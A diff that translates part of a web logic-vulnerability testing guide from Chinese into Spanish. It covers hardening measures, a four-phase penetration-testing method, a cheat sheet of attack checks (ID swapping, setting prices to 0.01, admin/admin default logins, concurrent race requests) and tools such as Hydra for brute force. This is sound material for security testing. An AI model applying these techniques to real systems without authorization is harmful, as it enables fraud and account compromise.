-| 网络 | 内网服务不暴露公网，VPN/堡垒机访问 |
-| 认证 | 强制复杂密码，禁用默认账户，启用MFA |
-| 授权 | 后端每接口校验权限，最小权限原则 |
-| Session | 登录后重新生成SessionID，HttpOnly+Secure |
-| 监控 | 异常登录告警，失败次数锁定，日志审计 |
-| 加固 | 关闭调试接口，删除默认管理页面 |
+| Red | los servicios internos no deben exponerse a internet público, acceso vía VPN/bastión |
+| Autenticación | forzar contraseñas complejas, deshabilitar cuentas predeterminadas, habilitar MFA |
+| Autorización | validar el permiso en cada interfaz en el backend, principio de mínimo privilegio |
+| Session | regenerar el SessionID tras el login, HttpOnly+Secure |
+| Monitoreo | alerta de login anómalo, bloqueo tras intentos fallidos, auditoría de logs |
+| Endurecimiento | cerrar interfaces de depuración, eliminar páginas de administración predeterminadas |
 
 ---
 
-## 六、系统化测试框架
+## Seis. Marco de pruebas sistemático
 
-### 6.1 四阶段测试法
+### 6.1 Método de prueba en cuatro fases
 
 ```
-Phase 1: 情报收集
-  - 枚举所有功能点与接口
-  - 绘制业务流程图
-  - 识别敏感操作(支付/重置/权限变更)
-  - 确定参数的可控性
+Fase 1: Recolección de información
+  - Enumerar todos los puntos funcionales e interfaces
+  - Dibujar el diagrama del flujo de negocio
+  - Identificar operaciones sensibles (pago/restablecimiento/cambio de permisos)
+  - Determinar la controlabilidad de los parámetros
 
-Phase 2: 威胁建模
-  - 分析每个接口的输入参数与信任边界
-  - 标记服务端 vs 前端校验
-  - 构建攻击树(按越权/支付/认证分类)
-  - 优先级排序(高影响 x 高可能性)
+Fase 2: Modelado de amenazas
+  - Analizar los parámetros de entrada y el límite de confianza de cada interfaz
+  - Marcar validación en servidor vs. en frontend
+  - Construir el árbol de ataque (clasificado por escalada/pago/autenticación)
+  - Priorizar (alto impacto x alta probabilidad)
 
-Phase 3: 漏洞验证
-  - 按优先级逐项测试
-  - 记录PoC(请求/响应截图)
-  - 评估影响范围(数据量/用户数/金额)
+Fase 3: Verificación de vulnerabilidades
+  - Probar cada elemento según prioridad
+  - Registrar el PoC (capturas de petición/respuesta)
+  - Evaluar el alcance del impacto (volumen de datos/número de usuarios/monto)
 
-Phase 4: 报告输出
-  - 漏洞描述+复现步骤
-  - 根因分析+影响评估
-  - 修复建议(短期+长期)
-  - 风险评级(CVSS)
+Fase 4: Elaboración del informe
+  - Descripción de la vulnerabilidad + pasos de reproducción
+  - Análisis de causa raíz + evaluación de impacto
+  - Recomendaciones de corrección (corto plazo + largo plazo)
+  - Clasificación de riesgo (CVSS)
 ```
 
-### 6.2 高频漏洞模式速查
+### 6.2 Referencia rápida de patrones de vulnerabilidad de alta frecuencia
 
-| 漏洞模式 | 检测信号 | 快速验证方法 |
+| Patrón de vulnerabilidad | Señal de detección | Método de verificación rápida |
 |----------|----------|-------------|
-| IDOR | URL/参数含自增ID | 替换ID看是否返回他人数据 |
-| 金额篡改 | 请求含price/amount | 改为0.01观察订单 |
-| 验证码回显 | 发验证码后抓包 | 搜索响应中4-6位数字 |
-| 步骤跳过 | 多步骤流程 | 直接访问后续步骤URL |
-| 响应篡改 | 客户端根据status跳转 | 改status=1看是否放行 |
-| 未授权后台 | 目录扫描发现管理路径 | 直接访问看是否需要登录 |
-| 弱口令 | 发现登录页 | 尝试admin/admin等默认凭证 |
-| 条件竞争 | 余额/库存/优惠券操作 | 并发50+请求观察是否多扣 |
+| IDOR | URL/parámetro contiene ID autoincremental | sustituir el ID y ver si devuelve datos de otro usuario |
+| Manipulación de monto | la petición contiene price/amount | cambiar a 0.01 y observar el pedido |
+| Fuga del código de verificación | interceptar tras enviar el código | buscar un número de 4-6 dígitos en la respuesta |
+| Omisión de pasos | flujo multietapa | acceder directamente a la URL del paso posterior |
+| Manipulación de respuesta | el cliente redirige según el status | cambiar status=1 y ver si permite avanzar |
+| Backend no autorizado | escaneo de directorios revela ruta de administración | acceder directamente y ver si requiere login |
+| Credencial débil | se encuentra página de login | probar credenciales predeterminadas como admin/admin |
+| Condición de carrera | operación de saldo/inventario/cupón | 50+ peticiones concurrentes y observar si hay deducción múltiple |
 
-### 6.3 实战工具推荐
+### 6.3 Herramientas recomendadas para la práctica
 
-| 工具 | 核心用途 | 适用场景 |
+| Herramienta | Uso principal | Escenario aplicable |
 |------|----------|----------|
-| BurpSuite | 流量拦截、参数篡改、重放 | 全场景核心工具 |
-| Postman | API测试、批量请求 | 接口逻辑测试 |
-| Hydra | 密码爆破 | 弱口令/撞库 |
-| OWASP ZAP | 自动化扫描 | 初步发现 |
-| 自定义脚本 | 并发测试、ID遍历 | 竞争条件/IDOR |
+| BurpSuite | intercepción de tráfico, manipulación de parámetros, replay | herramienta central para todos los escenarios |
+| Postman | prueba de API, peticiones masivas | prueba de lógica de interfaz |
+| Hydra | fuerza bruta de contraseñas | credenciales débiles/credential stuffing |
+| OWASP ZAP | escaneo automatizado | descubrimiento inicial |
+| Scripts personalizados | prueba de concurrencia, enumeración de ID | condición de carrera/IDOR |
 
 ---
 
-*文档版本: v1.0*
-*数据来源: WooYun漏洞库(88,636条): 逻辑缺陷(8,292条)+未授权访问(14,377条)*
-*生成时间: 2026-02-06*
+*Versión del documento: v1.0*
+*Fuente de datos: base de vulnerabilidades WooYun (88,636 registros): defectos de lógica (8,292 registros) + acceso no autorizado (14,377 registros)*
+*Fecha de generación: 2026-02-06*
